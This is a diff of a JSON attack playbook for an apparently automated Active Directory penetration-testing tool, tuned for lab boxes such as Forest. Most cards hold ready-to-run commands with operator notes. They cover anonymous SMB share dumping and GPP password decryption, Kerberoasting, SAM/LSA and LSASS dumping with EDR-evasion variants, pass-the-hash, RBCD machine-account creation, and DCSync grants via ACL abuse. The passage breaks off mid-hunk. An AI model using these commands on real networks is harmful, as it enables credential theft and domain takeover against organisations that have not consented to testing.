@@ -130,10 +130,11 @@
         "linux",
         "windows"
       ],
-      "requires_all": [
-        "scan.nmap.version"
+      "requires_all": [],
+      "requires_any": [
+        "scan.nmap.version",
+        "smb.smbv1"
       ],
-      "requires_any": [],
       "deprioritize_when": [
         "loot.ntds"
       ],
@@ -255,6 +256,9 @@
           "note": "PREFERRED: a NetExec LDAP smoke test. It verifies LDAP is reachable and generally reveals hostname and domain context without yet diving into deeper enumeration.",
           "settled_by": [
             "ad.anonymous_bind",
+            "ad.domain_known",
+            "ad.base_dn",
+            "ad.user_list",
             "ldap.authenticated"
           ]
         },
@@ -323,6 +327,9 @@
           "note": "Switchless probe first: does the DC even accept an anonymous LDAP bind? A [+] line means yes, and nxc prints the domain so you can confirm the target. Only once that is answered do you spend a query dumping the directory. Once an anonymous bind is proven, this probe drops out so you are not re-asking a question you answered.",
           "settled_by": [
             "ad.anonymous_bind",
+            "ad.domain_known",
+            "ad.base_dn",
+            "ad.user_list",
             "ldap.authenticated"
           ]
         },
@@ -688,26 +695,26 @@
     },
     {
       "id": "gpp-passwords",
+      "sequence": true,
       "transition": "gpp",
       "title": "Group Policy Preferences (GPP) Passwords & Hunting",
       "hypothesis": "Old Group Policy Preferences saved local-account passwords inside XML files under SYSVOL (or replica shares like Replication), readable by any domain user or anonymous sessions. The cpassword field is AES-encrypted with a key Microsoft disclosed publicly in 2012, so it is essentially cleartext. Recursively dump readable shares, grep for cpassword, and decrypt with gpp-decrypt.",
-      "tool": "nxc",
+      "tool": "smbclient",
       "tools": [
-        "nxc",
         "smbclient",
+        "nxc",
         "gpp-decrypt",
         "smbmap"
       ],
       "os": [
         "windows"
       ],
-      "requires_all": [
-        "ad.domain_known"
-      ],
+      "requires_all": [],
       "requires_any": [
         "smb.shares",
         "smb.readable_share",
         "smb.content_accessible",
+        "config.review",
         "loot.files",
         "credential.available"
       ],
@@ -725,37 +732,28 @@
       "refs": [],
       "commands": [
         {
-          "tool": "nxc",
-          "run": "nxc smb {{target}} -u '' -p '' -M gpp_password",
+          "tool": "smbclient",
+          "run": "smbclient '//{{target}}/{{share}}' -N -c 'recurse ON; prompt OFF; mget *'",
+          "settled_by": [
+            "ad.gpp_xml",
+            "ad.gpp_cpassword",
+            "credential.available",
+            "blocker.smb_null_denied"
+          ],
+          "note": "PREFERRED (Null/Anonymous session): Recursively downloads all readable files from the discovered share ({{share}}, e.g. Replication or SYSVOL) into your working directory so you can grep for GPP XMLs (Groups.xml, Services.xml, ScheduledTasks.xml)."
+        },
+        {
+          "tool": "sh",
+          "locus": "remote",
+          "run": "grep -ri \"cpassword\" . 2>/dev/null",
           "requires_any": [
-            "smb.shares",
+            "loot.files",
+            "config.review",
             "smb.readable_share",
             "smb.content_accessible"
           ],
           "settled_by": [
-            "credential.available",
-            "smb.authenticated",
-            "blocker.smb_null_denied"
-          ],
-          "note": "PREFERRED (Automated Remote Try): NetExec spiders SYSVOL for Groups.xml/ScheduledTasks.xml/Services.xml and decrypts with the public AES key. If unauthenticated, pass -u '' -p ''. Pair with -M gpp_autologin for registry autologons."
-        },
-        {
-          "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M gpp_password",
-          "note": "Authenticated SYSVOL GPP check: once you hold a domain credential, check SYSVOL for Group Policy Preferences cpassword XMLs."
-        },
-        {
-          "tool": "smbclient",
-          "run": "smbclient '//{{target}}/{{share}}' -N -c 'recurse ON; prompt OFF; mget *'",
-          "note": "RECURSIVE SHARE DUMP (Crucial when GPP is on Replication or a custom share): NetExec only checks SYSVOL; if a share like Replication is exposed, dump it locally so you can grep for XML files."
-        },
-        {
-          "tool": "sh",
-          "run": "grep -ri \"cpassword\" . 2>/dev/null",
-          "requires_any": [
-            "loot.files",
-            "smb.readable_share",
-            "smb.content_accessible"
+            "ad.gpp_cpassword"
           ],
           "note": "LOCATE CPASSWORDS: Grep through downloaded XML files (Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml) for the cpassword attribute and username."
         },
@@ -765,21 +763,66 @@
           "note": "OFFLINE AES DECRYPT: Built directly into Kali Linux. Pass the extracted cpassword string to instantly recover the plaintext password."
         },
         {
+          "tool": "smbclient",
+          "run": "smbclient '//{{target}}/{{share}}' -U '{{domain}}/{{user}}%{{password}}' -c 'recurse ON; prompt OFF; mget *'",
+          "settled_by": [
+            "ad.gpp_xml",
+            "ad.gpp_cpassword"
+          ],
+          "note": "AUTHENTICATED RECURSIVE SHARE DUMP: Once you hold a domain credential, recursively dump {{share}} (such as SYSVOL or a custom share) locally to grep for GPP XML files."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u '' -p '' -M gpp_password",
+          "requires_any": [
+            "smb.shares",
+            "smb.readable_share",
+            "smb.content_accessible"
+          ],
+          "settled_by": [
+            "ad.gpp_xml",
+            "ad.gpp_cpassword",
+            "credential.available",
+            "blocker.smb_null_denied"
+          ],
+          "note": "SYSVOL GPP Check: NetExec's -M gpp_password only checks SYSVOL by default (it ignores custom shares like Replication unless you use smbclient recurse/mget above or impacket-Get-GPPPassword -share {{share}})."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M gpp_password",
+          "settled_by": [
+            "ad.gpp_xml",
+            "ad.gpp_cpassword"
+          ],
+          "note": "Authenticated SYSVOL GPP check: once you hold a domain credential, check SYSVOL for Group Policy Preferences cpassword XMLs (note: -M gpp_password only checks SYSVOL by default, not custom shares like Replication)."
+        },
+        {
           "tool": "impacket-Get-GPPPassword",
-          "run": "impacket-Get-GPPPassword '{{domain}}/{{user}}:{{password}}'@{{target}}",
-          "note": "IMPACKET GPP DUMP: Authenticated GPP dumper targeting SYSVOL over SMB."
+          "run": "impacket-Get-GPPPassword '{{domain}}/{{user}}:{{password}}'@{{target}} -share '{{share}}'",
+          "settled_by": [
+            "ad.gpp_xml",
+            "ad.gpp_cpassword"
+          ],
+          "note": "IMPACKET GPP DUMP: Authenticated GPP dumper targeting {{share}} over SMB."
         }
       ],
       "phase": "creds"
     },
     {
       "id": "smb-share-inventory",
+      "sequence": true,
       "title": "Inventory Readable SMB Shares",
       "hypothesis": "A readable SMB share is a loot goldmine: configs, backups, scripts, and password stores are routinely left world- or domain-readable. Recursively inventory every readable share so obol can triage the file names for credential material to pull.",
-      "tool": "nxc",
+      "tool": "smbclient",
       "tools": [
+        "smbclient",
         "nxc",
-        "smbmap"
+        "smbmap",
+        "gpp-decrypt"
+      ],
+      "os": [
+        "windows",
+        "linux"
       ],
       "requires_all": [],
       "requires_any": [
@@ -807,24 +850,59 @@
       ],
       "commands": [
         {
+          "tool": "smbclient",
+          "run": "smbclient -N //{{target}}/{{share}} -c 'recurse; ls'",
+          "settled_by": [
+            "loot.files",
+            "ad.gpp_xml"
+          ],
+          "note": "PREFERRED for custom shares (e.g. Replication): recursively list every directory and file on {{share}} over a null session so obol can spot Groups.xml, configs, and backups."
+        },
+        {
+          "tool": "smbclient",
+          "run": "smbclient -N //{{target}}/{{share}} -c 'prompt OFF; recurse ON; mget *Groups.xml *Services.xml *ScheduledTasks.xml'",
+          "settled_by": [
+            "ad.gpp_xml",
+            "ad.gpp_cpassword"
+          ],
+          "note": "Pull Group Policy Preferences XML files directly from a custom share (like Replication) over a null session so you can grep for cpassword and run gpp-decrypt."
+        },
+        {
+          "tool": "smbclient",
+          "run": "smbclient //{{target}}/{{share}} -U '{{domain}}/{{user}}%{{password}}' -c 'recurse; ls'",
+          "note": "Authenticated recursive listing of {{share}} via smbclient when credentials are required."
+        },
+        {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u '' -p '' -M spider_plus",
           "settled_by": [
             "credential.available",
             "smb.authenticated",
+            "smb.null_session",
+            "smb.guest_session",
             "blocker.smb_null_denied"
           ],
-          "note": "Preferred quick start: spider every readable share over a null session. obol parses the JSON inventory into loot.files, then triage-detects sensitive names."
+          "note": "Automated null-session share spider: spiders every readable share and writes a JSON inventory to /tmp/nxc_hosted/nxc_spider_plus/."
         },
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p {{password}} -M spider_plus",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -M spider_plus",
           "note": "Authenticated spider once you hold a credential, usually reaches far more shares than the null session."
         },
         {
           "tool": "smbmap",
           "run": "smbmap -H {{target}} -u {{user}} -p {{password}} -R",
           "note": "Recursive listing of every readable share (READ ONLY marks accessible ones). obol parses the tree into loot.files."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u '' -p '' -M gpp_password",
+          "note": "WARNING: NetExec's -M gpp_password only checks SYSVOL by default (it ignores custom shares like Replication unless you use smbclient recurse/mget above or impacket-GetGPPPasswords)."
+        },
+        {
+          "tool": "gpp-decrypt",
+          "run": "gpp-decrypt {{cpassword}}",
+          "note": "Decrypt the cpassword extracted from Groups.xml / Services.xml / ScheduledTasks.xml."
         }
       ]
     },
@@ -835,6 +913,9 @@
       "tool": "nxc",
       "tools": [
         "nxc"
+      ],
+      "os": [
+        "windows"
       ],
       "requires_all": [],
       "requires_any": [
@@ -908,11 +989,15 @@
       "obsoleted_by": [
         "loot.ntds"
       ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
       "produces": [
         "hash.tgs",
         "credential.candidate"
       ],
-      "priority": 78,
+      "priority": 89,
       "proves": "yields a TGS (Kerberoast) hash and candidate credentials",
       "does_not_prove": "candidate material only, not yet a validated credential, and not access",
       "report": {
@@ -928,7 +1013,7 @@
         {
           "tool": "nxc",
           "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --kerberoasting {{hashfile}}",
-          "note": "PREFERRED: a single line roasts every SPN account directly into a file formatted for hashcat 13100. Use -H {{hash}} when all you have is the NTLM."
+          "note": "PREFERRED: a single line roasts every SPN account directly into a file formatted for hashcat 13100. Use -H {{nthash}} when all you have is the NTLM."
         },
         {
           "tool": "Rubeus",
@@ -948,7 +1033,7 @@
         {
           "tool": "targetedKerberoast",
           "run": "targetedKerberoast.py -d {{domain}} -u {{user}} -p {{password}} --dc-ip {{target}}",
-          "note": "A 0xdf go-to for privilege escalation: it roasts only the accounts you can write to (GenericAll/GenericWrite), adds a temporary SPN, requests the ticket, and then tidies up. No existing SPN required."
+          "note": "A reliable ACL privilege-escalation technique: it roasts only the accounts you can write to (GenericAll/GenericWrite), adds a temporary SPN, requests the ticket, and then tidies up. No existing SPN required."
         },
         {
           "tool": "sh",
@@ -975,6 +1060,8 @@
       ],
       "requires_any": [
         "credential.candidate",
+        "credential.password",
+        "credential.plaintext",
         "ad.domain_known",
         "ad.dc_candidate",
         "ldap.reachable",
@@ -1046,7 +1133,9 @@
       ],
       "requires_any": [],
       "deprioritize_when": [
-        "loot.ntds"
+        "loot.ntds",
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "ad.graph.collected",
@@ -1151,7 +1240,9 @@
         "ad.acl_lead"
       ],
       "deprioritize_when": [
-        "loot.ntds"
+        "loot.ntds",
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "ad.attack_paths",
@@ -1172,6 +1263,11 @@
         {
           "tool": "nxc",
           "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M daclread -o TARGET='Domain Admins' ACTION=read",
+          "settled_by": [
+            "ad.acl_lead",
+            "ad.control_paths",
+            "ad.attack_paths"
+          ],
           "note": "Who holds WriteDacl/GenericAll/WriteOwner over a high-value object, the ACL edges bloodyad-acl/ad-acl-abuse cash in. Point TARGET at the domain object (base DN) to find who can grant themselves DCSync."
         },
         {
@@ -1183,7 +1279,7 @@
             "ad.attack_paths"
           ],
           "web": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
-          "web_note": "In a large domain --detail can run to tens of thousands of lines, too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence, obol only needs the writable-object lines.",
+          "web_note": "Heads up: --detail generates tens of thousands of lines of output (too large to paste). Run this command in its own terminal tab; it saves directly to scans/bloodyad-writable.txt — then submit that .txt file in the Evidence tab.",
           "note": "LANE 1 companion to the nxc queries above (also remote, no foothold): the single highest-signal writable-objects question, what objects can THIS account write to? Every writable group/user/computer is a candidate edge (join a group, reset a password, add a shadow cred, grant DCSync). Reach for this when nxc's daclread needs a wider sweep."
         },
         {
@@ -1253,7 +1349,7 @@
         },
         {
           "tool": "cmd",
-          "run": "whoami /groups; whoami /priv; net user {{user}} /domain; net group \"Domain Admins\" /domain",
+          "run": "cmd /c \"whoami /groups & whoami /priv & net user {{user}} /domain & net group \\\"Domain Admins\\\" /domain\"",
           "note": "LANE 3 (built-in, nothing to upload): your group memberships + privileges (SeImpersonate/SeBackup/SeRestore are instant local-SYSTEM leads), plus the account and DA roster. Always available, even on a locked-down box where you can't run PowerView."
         }
       ]
@@ -1280,6 +1376,12 @@
         "credential.candidate",
         "loot.ntds"
       ],
+      "settled_by": [
+        "loot.ntds",
+        "loot.sam",
+        "loot.lsa",
+        "hash.ntlm"
+      ],
       "priority": 96,
       "proves": "produces NTLM hashes, candidate credentials, and NTDS secrets",
       "does_not_prove": "candidate material only, not yet a validated credential, and not access",
@@ -1294,7 +1396,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --sam --lsa",
-          "note": "Local SAM hashes plus LSA secrets (service passwords, cached credentials) in a single run. Use -H {{hash}} for pass-the-hash. Aim {{target}} at a subnet or a targets file to loot every host in one go, this is where nxc outshines everything else."
+          "note": "Local SAM hashes plus LSA secrets (service passwords, cached credentials) in a single run. Use -H {{nthash}} for pass-the-hash. Aim {{target}} at a subnet or a targets file to loot every host in one go, this is where nxc outshines everything else."
         },
         {
           "tool": "nxc",
@@ -1304,7 +1406,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M lsassy",
-          "note": "Remote LSASS dump from Kali, the preferred alternative to getting on the box with mimikatz/procdump: nxc drives lsassy to pull logged-on plaintext and NT hashes over SMB. Use -H {{hash}} for pass-the-hash. EDR in the way? Swap the module for an evasion variant that dumps the same memory: -M nanodump, -M handlekatz, -M procdump, or -M masky (ADCS-backed). This is the remote twin of the on-host LSASS dump."
+          "note": "Remote LSASS dump from Kali, the preferred alternative to getting on the box with mimikatz/procdump: nxc drives lsassy to pull logged-on plaintext and NT hashes over SMB. Use -H {{nthash}} for pass-the-hash. EDR in the way? Swap the module for an evasion variant that dumps the same memory: -M nanodump, -M handlekatz, -M procdump, or -M masky (ADCS-backed). This is the remote twin of the on-host LSASS dump."
         },
         {
           "tool": "nxc",
@@ -1373,7 +1475,9 @@
       "requires_all": [],
       "requires_any": [
         "access.admin",
-        "ad.control_paths"
+        "access.admin_share",
+        "ad.control_paths",
+        "ad.domain_control"
       ],
       "produces": [
         "loot.ntds",
@@ -1420,6 +1524,14 @@
     {
       "id": "own-domain-pth",
       "title": "Own the Domain, Pass-the-Hash as Administrator",
+      "credential_probe": {
+        "users": [
+          "administrator"
+        ],
+        "methods": [
+          "dcsync"
+        ]
+      },
       "hypothesis": "A completed DCSync / NTDS dump handed you every domain hash, the built-in Administrator (RID 500) among them. There is nothing left to crack: pass that NT hash straight into a login and you ARE Domain Administrator. Confirm it, take an interactive shell, and read the flags, this is the box.",
       "tool": "evil-winrm",
       "tools": [
@@ -1498,8 +1610,12 @@
       "requires_all": [],
       "requires_any": [
         "credential.available",
+        "credential.password",
+        "credential.plaintext",
         "hash.ntlm",
-        "rdp.authenticated"
+        "rdp.authenticated",
+        "access.admin_share",
+        "ad.gpo_control"
       ],
       "produces": [
         "foothold.windows"
@@ -1908,7 +2024,7 @@
       "requires_any": [
         "ad.delegation",
         "ad.rbcd",
-        "ad.unconstrained",
+        "ad.unconstrained",
         "ad.control_paths",
         "ad.maq_allow"
       ],
@@ -1931,7 +2047,7 @@
       "commands": [
         {
           "tool": "impacket-addcomputer",
-          "run": "impacket-addcomputer {{domain}}/{{user}}:{{password}} -dc-ip {{target}} -computer-name OBOL$ -computer-pass {{password}}",
+          "run": "impacket-addcomputer {{domain}}/{{user}}:{{password}} -dc-ip {{target}} -computer-name OBOL$ -computer-pass '{{newpass|Passw0rd123!}}'",
           "note": "PREFERRED remote RBCD path, from Kali. Step 1: create a machine account you control (assuming the quota permits). ntlmrelayx --add-computer does the same thing."
         },
         {
@@ -2176,8 +2292,13 @@
       ],
       "produces": [
         "credential.candidate",
-        "ad.attack_paths",
+        "ad.sccm_candidates",
         "sccm.enumerated"
+      ],
+      "settled_by": [
+        "sccm.enumerated",
+        "ad.sccm_candidates",
+        "credential.candidate"
       ],
       "priority": 84,
       "proves": "surfaces candidate credentials and attack paths",
@@ -2221,6 +2342,11 @@
         "port:445"
       ],
       "obsoleted_by": [
+        "loot.ntds"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system",
         "loot.ntds"
       ],
       "produces": [
@@ -2293,11 +2419,14 @@
         "windows"
       ],
       "requires_all": [
-        "enum.deep"
+        "smb.reachable",
+        "credential.available"
       ],
       "requires_any": [
-        "credential.available",
-        "hash.ntlm"
+        "ad.computer_list",
+        "network.subnet_candidate",
+        "host.arp_neighbor",
+        "enum.deep"
       ],
       "produces": [
         "foothold.windows"
@@ -2577,8 +2706,8 @@
     },
     {
       "id": "fix-acl-reauth",
-      "title": "ACL Write Denied: Re-Authenticate After the Grant",
-      "hypothesis": "insufficientAccessRights / ERROR_ACCESS_DENIED on a bloodyAD write (add dcsync, set owner, add groupMember) right after you added yourself to the group that confers the right is the classic AD wall: the right is real, but your CURRENT session's token was issued BEFORE the membership change, so the DC does not see it yet. Re-authenticate so a fresh token carries the new group, then the exact same write succeeds. This strands people one step from Domain Admin on boxes like Forest.",
+      "title": "ACL Write Denied: Re-Join & Re-Authenticate After the Grant",
+      "hypothesis": "insufficientAccessRights / ERROR_ACCESS_DENIED on a bloodyAD write (add dcsync, set owner, add groupMember) right after you added yourself to the group that confers the right has two classic causes: (1) on shared labs (like Forest), a background cleanup task periodically resets group memberships every few minutes, so waiting between the group join and add dcsync lets the lab strip your membership; or (2) a cached Kerberos ticket predates the membership change. Chaining the group join and the DACL grant back-to-back with && (and clearing any stale ccache) defeats both.",
       "tool": "bloodyad",
       "tools": [
         "bloodyad",
@@ -2590,12 +2719,19 @@
       "requires_all": [
         "blocker.acl_reauth"
       ],
+      "obsoleted_by": [
+        "ad.control_paths",
+        "ad.domain_control",
+        "loot.ntds"
+      ],
       "produces": [
-        "advice.reauth"
+        "advice.reauth",
+        "ad.control_paths",
+        "ad.domain_control"
       ],
       "priority": 88,
       "sequence": true,
-      "proves": "the ACL write (DCSync grant / owner change) lands once you re-authenticate with the new membership",
+      "proves": "the ACL write (DCSync grant / owner change) lands once you re-join the group and authenticate fresh back-to-back",
       "does_not_prove": "a new right, it makes the right you just granted yourself actually take effect in your session",
       "report": {
         "finding": "ACL write re-authentication resolved",
@@ -2607,23 +2743,31 @@
       "commands": [
         {
           "tool": "bloodyad",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get object \"{{user}}\" --attr memberOf",
-          "note": "First confirm the add actually stuck: this should list the group you just joined (e.g. Exchange Windows Permissions). If it does NOT, the add silently failed, re-run it. If it DOES, your current session token simply predates it, go to the next step."
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add groupMember \"{{joined_group}}\" '{{user}}' && bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'",
+          "settled_by": [
+            "ad.control_paths",
+            "ad.domain_control"
+          ],
+          "note": "PREFERRED (One-Shot Chained Recovery): Re-adds '{{user}}' to \"{{joined_group}}\" and immediately grants DCSync rights back-to-back so a shared lab cleanup timer cannot revert your group membership in between."
+        },
+        {
+          "tool": "bloodyad",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' get object \"{{user}}\" --attr memberOf",
+          "note": "Check whether the group membership is still present on '{{user}}'. If \"{{joined_group}}\" is missing from memberOf, a lab cleanup script reverted the group — run Command 1 above to re-join and grant DCSync in one shot."
         },
         {
           "tool": "kdestroy",
           "run": "kdestroy -A 2>/dev/null; unset KRB5CCNAME",
-          "note": "Clear any cached Kerberos ticket. A TGT from an earlier kinit / getTGT carries your group memberships from BEFORE the add, and bloodyAD will happily reuse it, so the DC keeps seeing the old groups. Clearing it forces the next command to authenticate fresh."
+          "note": "Clear any cached Kerberos ticket. A TGT from an earlier kinit / getTGT carries your group memberships from BEFORE the add, and bloodyAD will reuse it if KRB5CCNAME is set. Clearing it forces the next command to authenticate fresh."
         },
         {
           "tool": "bloodyad",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
-          "note": "Retry the grant. With a fresh authentication (no stale ticket) your new membership is in the token, so your WriteDACL over the domain object is honored and the two DS-Replication ACEs are written. Then run the `dcsync` / secretsdump card."
-        },
-        {
-          "tool": "bloodyad",
-          "run": "sleep 30; bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
-          "note": "Still denied? The token/replication can lag a few seconds on a busy DC, wait and retry. If you authenticate over Kerberos (-k) rather than a password, get a FRESH TGT after the group add (kinit / getTGT.py), the old TGT will never carry the new group SID no matter how many times you retry."
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'",
+          "settled_by": [
+            "ad.control_paths",
+            "ad.domain_control"
+          ],
+          "note": "Retry the grant alone once your membership is confirmed and any stale Kerberos ticket is cleared."
         }
       ],
       "requires_any": []
@@ -2746,6 +2890,11 @@
       "commands": [
         {
           "tool": "nxc",
+          "run": "nxc smb {{target}} -u '' -p '' --pass-pol",
+          "note": "ANONYMOUS LOCKOUT POLICY CHECK: Read the domain lockout threshold and observation window over an unauthenticated/null SMB session before using any locked or restricted account."
+        },
+        {
+          "tool": "nxc",
           "run": "nxc smb {{dc}} -u {{user}} -p {{password}} --pass-pol",
           "note": "LOCKOUT: read the lockout policy (threshold + observation window). Stop spraying, wait out the window, and from now on spray ONE password across many users with a long --delay - never many passwords at one user."
         },
@@ -2776,7 +2925,7 @@
       "requires_any": [
         "ad.attack_paths",
         "ad.acl_lead",
-        "ad.control_paths",
+        "ad.acl_paths",
         "ad.domain_known",
         "ad.dc_candidate",
         "ldap.reachable",
@@ -2786,8 +2935,13 @@
       "obsoleted_by": [
         "loot.ntds"
       ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
       "produces": [
         "ad.control_paths",
+        "ad.domain_control",
         "credential.candidate"
       ],
       "priority": 92,
@@ -2811,28 +2965,48 @@
             "ad.attack_paths"
           ],
           "web": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
-          "web_note": "In a large domain --detail can run to tens of thousands of lines, too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence, obol only needs the writable-object lines.",
+          "web_note": "Heads up: --detail generates tens of thousands of lines of output (too large to paste). Run this command in its own terminal tab; it saves directly to scans/bloodyad-writable.txt — then submit that .txt file in the Evidence tab.",
           "note": "Begin here: what can your account genuinely write to? The detailed output is your menu of options."
         },
         {
           "tool": "bloodyad",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
           "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add groupMember \"{{group}}\" '{{user}}'",
           "settled_by": [
             "ad.group_joined"
           ],
+          "web_note": "Timing heads-up: shared labs often run a cleanup task every few minutes that resets group memberships. Paste this output and run the follow-up `add dcsync` command right away.",
           "note": "The winning add: obol fills {{group}} with the highest-value group you can write to, a group whose membership hands you domain control (e.g. Exchange Windows Permissions -> WriteDACL over the domain -> DCSync), not merely the first one enumerated. Add yourself, then RE-AUTHENTICATE (new login / fresh ticket) so the membership takes effect, then run the `add dcsync` card below and secretsdump the Administrator hash. If bloodyAD reports the add succeeded but the next step is still denied, you have not re-authenticated yet."
         },
         {
           "tool": "bloodyad",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
           "run": "for g in {{abuse_groups_quoted}}; do bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add groupMember \"$g\" {{user}} 2>/dev/null && echo \"[+] JOINED: $g\"; done",
           "settled_by": [
             "ad.group_joined"
           ],
+          "web_note": "Timing heads-up: shared labs often run a cleanup task every few minutes that resets group memberships. Paste this output and run the follow-up `add dcsync` command right away.",
           "note": "Fire on every reasonable group at once, obol fills the list with the high-value groups you can write to (or the usual suspects when the lead is thin), so you don't have to guess which one is the path. Any line that prints '[+] JOINED' is a group you now belong to; RE-AUTHENTICATE (fresh login / new ticket), then run the `add dcsync` card, a membership like Exchange Windows Permissions grants WriteDACL over the domain object, which is what makes DCSync stick. Paste the whole output back here and obol records each group you joined."
         },
         {
           "tool": "bloodyad",
           "win": true,
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
           "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'",
           "settled_by": [
             "ad.control_paths",
@@ -2842,7 +3016,13 @@
         },
         {
           "tool": "impacket-dacledit",
-          "run": "impacket-dacledit -action write -rights DCSync -principal {{user}} -target-dn '{{basedn}}' '{{domain}}/{{user}}:{{password}}'",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
+          "run": "impacket-dacledit -action write -rights DCSync -principal '{{user}}' -target-dn '{{basedn}}' -dc-ip {{target}} '{{domain}}/{{user}}:{{password}}'",
           "settled_by": [
             "ad.control_paths",
             "ad.domain_control"
@@ -2851,31 +3031,67 @@
         },
         {
           "tool": "bloodyad",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
           "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' set owner \"{{target_sam}}\" {{user}}",
           "note": "A WriteOwner edge (a DIFFERENT primitive, not the DCSync path). Take ownership of a specific object when your lead is WriteOwner over it, then grant yourself control over that object below. Owning a group is not the same as replication rights, for DCSync use the `add dcsync` card above."
         },
         {
           "tool": "bloodyad",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
           "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add genericAll \"{{target_sam}}\" {{user}}",
           "note": "Award yourself GenericAll over an object you own or can write the DACL of. From there you can reset its password, targeted-Kerberoast it, or add shadow credentials, the route when the target is a USER/computer rather than a WriteDACL-over-domain group."
         },
         {
           "tool": "impacket-dacledit",
-          "run": "impacket-dacledit -action write -rights FullControl -principal {{user}} -target {{target_sam}} '{{domain}}/{{user}}:{{password}}'",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
+          "run": "impacket-dacledit -action write -rights FullControl -principal '{{user}}' -target '{{target_sam}}' -dc-ip {{target}} '{{domain}}/{{user}}:{{password}}'",
           "note": "The Impacket option for a general FullControl grant on an object when bloodyAD is not available."
         },
         {
           "tool": "bloodyad",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
           "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' remove uac '{{target_sam}}' -f ACCOUNTDISABLE",
           "note": "Enable disabled account: removes the ACCOUNTDISABLE flag from userAccountControl via LDAP when holding GenericWrite or GenericAll over {{target_sam}}."
         },
         {
           "tool": "powershell",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
           "run": "Get-ADObject -filter 'isDeleted -eq $true -and name -ne \"Deleted Objects\"' -includeDeletedObjects -property objectSid,lastKnownParent",
           "note": "AD Recycle Bin hunt: query deleted objects when BloodHound shows unresolved SIDs with inbound ACEs (e.g. S-1-5-21-...-1111 holding permissions). Pipe to Restore-ADObject -TargetPath '<ou>' to resurrect."
         },
         {
           "tool": "owneredit.py",
+          "requires_any": [
+            "ad.acl_lead",
+            "ad.group_joined",
+            "ad.attack_paths",
+            "ad.control_paths"
+          ],
           "run": "owneredit.py -action write -owner '{{user}}' -target '{{target_sam}}' '{{domain}}'/'{{user}}':'{{password}}' -dc-ip {{target}}",
           "note": "BloodHound WriteOwner abuse: Take ownership of the victim object (group or user) via owneredit.py. Follow up with dacledit.py to grant WriteMembers or GenericAll."
         }
@@ -3064,8 +3280,7 @@
         "rubeus"
       ],
       "os": [
-        "windows",
-        "linux"
+        "windows"
       ],
       "requires_all": [
         "ad.domain_known"
@@ -3209,7 +3424,9 @@
         "access.desktop"
       ],
       "deprioritize_when": [
-        "loot.ntds"
+        "loot.ntds",
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "ad.user_list",
@@ -3226,7 +3443,7 @@
       "commands": [
         {
           "tool": "xfreerdp",
-          "run": "xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' /d:{{domain}} /cert:ignore +clipboard /dynamic-resolution",
